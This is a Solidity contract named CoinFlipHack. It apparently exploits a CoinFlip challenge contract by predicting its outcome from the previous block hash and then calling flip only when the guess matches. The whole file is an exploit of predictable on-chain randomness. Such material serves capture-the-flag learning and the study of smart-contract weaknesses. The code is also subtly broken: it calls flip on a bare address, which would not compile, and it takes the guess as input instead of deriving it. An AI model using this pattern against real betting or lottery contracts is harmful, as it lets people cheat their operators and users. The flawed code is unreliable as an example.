// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "hardhat/console.sol";

contract CoinFlipHack {

  using SafeMath for uint256;
  address CoinFlip;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _CoinFlip) public {
    CoinFlip = _CoinFlip;
  }

  function hackFlip(bool _guess) public {
    // Get the current blockHash
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    require(side == _guess, "");

    CoinFlip.flip(_guess);
  }
}